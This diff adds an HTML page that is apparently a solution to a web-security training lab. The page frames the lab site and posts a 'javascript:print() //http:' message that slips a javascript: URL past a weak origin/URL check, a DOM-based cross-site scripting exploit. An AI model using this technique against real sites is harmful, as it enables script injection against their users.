@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>challenge 2</title>
+</head>
+<body>
+    <iframe id="test" src="https://0a7900810361213a8165e83c003d00d8.web-security-academy.net/" frameborder="0"></iframe>
+    <script>
+        const frame = document.querySelector("#test");
+        frame.onload = () => {
+            frame.contentWindow.postMessage("javascript:print() //http:", '*');
+        };
+    </script>
+</body>
+</html>
